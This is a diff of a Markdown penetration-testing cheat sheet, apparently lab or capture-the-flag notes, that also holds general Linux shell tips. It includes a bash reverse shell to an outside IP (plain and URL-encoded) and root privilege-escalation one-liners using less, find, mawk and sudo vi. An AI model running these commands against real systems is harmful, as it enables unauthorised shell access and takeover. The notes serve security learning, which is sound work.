@@ -26,6 +26,7 @@ Locate exploits:
 
 ```bash
 searchsploit <name_of_program> 
+
 #to pull exploit code:
 searchsploit -x <name/number of exploit>
 ```
@@ -33,6 +34,8 @@ searchsploit -x <name/number of exploit>
 enumerate running processes: `pspy`
 
 enumeration multi-tool: [Sparta](https://sparta.secforce.com/) \(does nmap, hydra, nikto, sqlscan, ssl...\)
+
+Semi-automated enumeration all-in-one (use this!): [nmapAutomator](https://github.com/21y4d/nmapAutomator)
 
 Unix hardening tool that can be used for enumeration: [Bastille](http://bastille-linux.sourceforge.net/)
 
@@ -54,6 +57,7 @@ bash reverse shell:
 
 ```text
 bash -i >& /dev/tct/10.10.14.148/9001 0>&1
+
 #URL encoded: 
 bash+-i+>%26+/dev/tcp/10.10.14.148/9001+0>%261
 ```
@@ -95,13 +99,13 @@ tmux plugins:
 
 [https://payatu.com/guide-linux-privilege-escalation](https://payatu.com/guide-linux-privilege-escalation)
 
-execute command as another user: `sudo -u <username> [command]`
+execute `sudo` command as another user: `sudo -u <username> [command]`
 
-execute any command while in less: `!<cmd>`
+execute any command while in `less`: `!<cmd>`
 
-Privilege Escalation to Root with suid /bin/less: `chmod 47555 /bin/less`
+Privilege Escalation to Root by setting suid on `/bin/less`: `chmod 47555 /bin/less`
 
-Privilege Escalation to Root with find: `sudo find /etc -exec sh -i \;`
+Privilege Escalation to Root with `find`: `sudo find /etc -exec sh -i \;`
 
 wildcard injection: \[NEED MORE HERE\]
 
@@ -109,7 +113,8 @@ wildcard injection: \[NEED MORE HERE\]
 mawk 'BEGIN {system("/bin/sh")}'
 ```
 
-```text
+If your user can `sudo` any of these text editors:
+```bash
 1. [user@localhost]$ sudo vi
 2. :shell
 3. [root@localhost]#
@@ -150,14 +155,25 @@ base64 -w 0 /path/of/file/name.file
 echo -n <base64material> | base64 -d > filename.file
 ```
 
-pretty print text in console? \[Haven't looked this one up\]: `jq`
+pretty print JSON text in console (https://www.howtogeek.com/529219/how-to-parse-json-files-on-the-linux-command-line-with-jq/). Pipe the JSON output to `jq`.  Example from NASA ISS API: `curl -s http://api.open-notify.org/iss-now.json | jq`
 
 web application fuzzer: [wfuzz](https://github.com/xmendez/wfuzz)
 
 convert rpm to debian packages: `alien <file.rpm>`
 
-Makes PWD part of path so dont need './' \[NOT RECOMMENDED!\]: `export PATH='pwd':$PATH`
+Add new $PATHs to `.profile` rather than '.bashrc`
 
+Makes `pwd` part of path so dont need `./` * NOT RECOMMENDED for home use! * `export PATH='pwd':$PATH`
+
+The bullet-proof way to add a path (e.g., ~/opt/bin) to the PATH environment variable is:
+(from https://unix.stackexchange.com/questions/26047/how-to-correctly-add-a-path-to-path)
+```
+PATH="${PATH:+${PATH}:}~/opt/bin"
+for appending (instead of PATH="$PATH:~/opt/bin") and
+
+PATH="~/opt/bin${PATH:+:${PATH}}"
+for prepending (instead of PATH="~/opt/bin:$PATH")
+```
 cycle through previous arguments: `alt-.`
 
 move between "words" on a command line `ctrl-[arrow_keys]`
